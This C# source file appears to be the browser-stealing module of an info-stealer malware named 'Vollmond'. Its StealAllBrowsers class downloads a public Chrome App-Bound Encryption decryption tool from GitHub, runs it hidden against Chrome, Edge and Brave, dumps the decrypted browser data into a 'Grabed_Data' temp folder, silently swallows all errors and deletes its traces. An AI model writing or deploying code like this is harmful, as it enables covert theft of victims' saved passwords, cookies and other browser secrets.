/*
 ----------------------------------------
Here is using Chrome-App-Bound Decryption tool.
 ----------------------------------------
original repository:  https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption - This repository with MIT License !!!
 ----------------------------------------
 */

using System.Diagnostics;
using System.IO.Compression;
using System.Text;

namespace Vollmond.Browsers
{
    internal class StealAllBrowsers
    {
        public static async void Steal()
        {
            try
            {
                var temp = Path.GetTempPath();
                
                if (File.Exists(temp + "\\chromelevator_x64.zip") || File.Exists(temp + "\\chromelevator_x64.exe"))
                {
                    File.Delete(temp + "\\chromelevator_x64.zip");
                    File.Delete(temp + "\\chromelevator_x64.exe");
                }
                using (var client = new HttpClient())
                {
                    var link = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.20.0/chrome-injector-v0.20.0.zip";
                    await using var stream = await client.GetStreamAsync(link);
                    await using var file = File.Create(temp + "\\chromelevator_x64.zip");
                    await stream.CopyToAsync(file);
                }

                ZipFile.ExtractToDirectory(temp + "\\chromelevator_x64.zip", temp);

                // Unnecessary files
                File.Delete(temp + "\\chromelevator_arm64.exe");
                File.Delete(temp + "\\encryptor.exe");

                using (Process process = new())
                {
                    process.StartInfo.FileName = temp + "\\chromelevator_x64.exe";
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.StandardOutputEncoding = Encoding.UTF8;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.Arguments = $"-v -f -o \"C:/Users/{Environment.UserName}/AppData//Local/Temp/Grabed_Data/BrowersData\" all"; // -v - --verbose, -f - --fingerprint, -o - --outup-path <path>, all - All browsers (chrome, edge and brave)

                    process.Start();

                    using (StreamReader reader = process.StandardOutput)
                        File.WriteAllText(Path.Combine(temp, "Grabed_Data", "BrowsersData", "info.txt"), reader.ReadToEnd());
                }
            }
            catch { }
            finally
            {
                try
                {
                    File.Delete(Path.Combine(Path.GetTempPath(), "chromelevator_x64.zip"));
                    File.Delete(Path.Combine(Path.GetTempPath(), "chromelevator_x64.exe"));
                }
                catch { }
            }
            }
        }
    }
